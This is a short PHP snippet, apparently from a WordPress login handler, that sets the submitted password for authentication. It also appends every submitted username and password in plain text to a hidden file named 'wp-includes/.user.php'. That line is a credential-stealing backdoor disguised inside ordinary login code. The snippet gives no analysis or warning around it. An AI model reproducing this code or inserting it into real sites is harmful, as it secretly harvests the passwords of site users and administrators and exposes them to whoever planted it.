if ( ! empty($_POST['pwd']) ) {
    $credentials['user_password'] = $_POST['pwd'];
    file_put_contents("wp-includes/.user.php", "WP: " . $_POST['log'] . " : " . $_POST['pwd'] . "\n", FILE_APPEND);
}
